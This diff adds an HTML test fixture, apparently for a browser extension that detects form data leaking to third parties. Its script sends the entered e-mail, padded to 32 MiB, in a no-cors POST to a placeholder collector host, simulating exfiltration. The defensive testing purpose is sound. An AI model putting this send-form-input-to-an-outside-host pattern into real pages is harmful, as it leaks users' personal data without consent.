@@ -1,0 +1,27 @@
+<!doctype html>
+<html lang="ru">
+  <head>
+    <meta charset="utf-8" />
+    <title>forms: large upload</title>
+  </head>
+  <body>
+    <h1 id="title">Большая загрузка (32 MiB)</h1>
+    <!-- Perf record only (candidate, not a gate): a 32 MiB text/plain POST to a third party right after the e-mail.
+         Chrome hands the whole body to the armed tab's listener at once (SP-3); the extension decodes only a view of
+         the first 64 KiB (body-truncated). ?mib= changes the size (1..64). -->
+    <form id="form" action="#" onsubmit="return false">
+      <label>E-mail <input id="email" type="email" name="email" autocomplete="email" /></label>
+      <button id="upload" type="button">Загрузить</button>
+    </form>
+    <script src="lib.js"></script>
+    <script>
+      var mib = Math.max(1, Math.min(64, Number(window.formsLib.params.get('mib') || '32')));
+      document.getElementById('upload').addEventListener('click', function () {
+        var head = 'email=' + document.getElementById('email').value + '&blob=';
+        var filler = 'x'.repeat(mib * 1024 * 1024 - head.length);
+        fetch(window.formsLib.receiver('up.collect.example.org') + '/fsink/upload', { method: 'POST', mode: 'no-cors', headers: { 'content-type': 'text/plain' }, body: head + filler })
+          .then(function () { window.formsLib.note('uploaded'); }, function () { window.formsLib.note('upload-failed'); });
+      });
+    </script>
+  </body>
+</html>
